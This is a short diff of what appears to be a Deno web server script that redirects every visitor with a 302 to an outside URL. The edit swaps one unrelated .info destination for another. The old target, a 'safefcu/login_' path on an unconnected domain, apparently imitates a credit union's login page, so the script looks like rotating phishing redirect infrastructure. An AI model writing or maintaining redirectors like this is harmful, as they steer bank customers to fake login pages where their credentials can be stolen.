@@ -5,7 +5,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://acexur.info/safefcu/login_/",
+      Location: "https://acesdeaocliconline.info/burke/herbert/",
     },
   });
 });
